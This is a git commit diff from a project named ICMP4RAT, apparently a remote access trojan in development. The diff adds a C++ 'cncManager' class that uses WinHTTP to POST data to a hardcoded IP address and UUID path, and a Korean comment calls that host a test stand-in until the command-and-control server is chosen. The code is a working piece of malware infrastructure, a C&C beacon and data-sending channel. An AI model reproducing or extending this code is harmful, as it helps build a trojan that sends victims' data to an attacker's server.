c6fff0bb72d62a6e97ef260b1966bcdbc06b72c2
jjanguu <tk3414@naver.com>
2022-05-04 02:32:19 +0900

    adding HTTP Request Code.

--- ICMP4RAT/ICMP4RAT/cncManager.cpp
+++ ICMP4RAT/ICMP4RAT/cncManager.cpp
@@ -1,1 +1,39 @@
+#include <iostream>
 #include "cncManager.h"
+
+cncManager::cncManager() {
+	this->hSession = WinHttpOpen(L"ICMP4RAT", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
+
+	if (this->hSession)
+		this->hConnect = WinHttpConnect(this->hSession, this->server, INTERNET_DEFAULT_HTTP_PORT, 0);
+}
+
+void cncManager::sendHttpRequest(LPCWSTR data, DWORD dlen) {
+	if (this->hConnect)
+		this->hRequest = WinHttpOpenRequest(this->hConnect, L"POST", this->index, NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
+
+	/* WINHTTP_NO_REQUEST_DATA == NULL*/
+	/*if (this->hRequest)
+		this->bResults = WinHttpSendRequest(this->hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0);*/
+	if (hRequest)
+		bResults = WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, (LPVOID)data, dlen, dlen, 0);
+
+	if (this->bResults)
+		this->bResults = WinHttpReceiveResponse(this->hRequest, NULL);
+
+	if (!this->bResults)
+		std::cout << "Error" << GetLastError() << "has occurred." << std::endl;
+}
+
+cncManager::~cncManager() {
+	/* Delete Http Handle*/
+	if (this->hRequest) WinHttpCloseHandle(this->hRequest);
+	if (this->hConnect) WinHttpCloseHandle(this->hConnect);
+	if (this->hSession) WinHttpCloseHandle(this->hSession);
+}
+
+int main() {
+	cncManager client;
+	client.sendHttpRequest(L"testtest", 8);
+	
+}
--- ICMP4RAT/ICMP4RAT/cncManager.h
+++ ICMP4RAT/ICMP4RAT/cncManager.h
@@ -1,5 +1,27 @@
 #pragma once
+#include <Windows.h>
+#include "DDproto.h"
+#include <winhttp.h>
+
 class cncManager
 {
-};
+private:
+	LPCWSTR
+		/* 일단 C&C 정해지기 전이라 테스트용*/
+		server = L"46.4.105.116",
+		index = L"/a4247dfc-6bb9-4e95-a705-a39b0f1788ba";
 
+	HINTERNET
+		hSession = NULL,
+		hConnect = NULL,
+		hRequest = NULL;
+
+	BOOL bResults = FALSE;
+
+public:
+	cncManager();
+	~cncManager();
+	void sendHttpRequest(LPCWSTR data, DWORD dlen);
+
+
+};
